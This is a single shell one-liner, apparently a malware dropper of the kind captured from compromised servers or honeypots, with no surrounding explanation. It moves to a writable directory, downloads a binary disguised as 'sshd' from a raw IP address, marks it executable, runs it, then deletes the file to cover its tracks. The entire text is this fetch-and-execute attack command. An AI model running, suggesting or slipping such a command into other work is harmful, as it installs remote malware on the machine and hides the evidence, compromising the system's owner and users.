cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.249.8/sshd; chmod +x sshd; ./sshd; rm -rf sshd
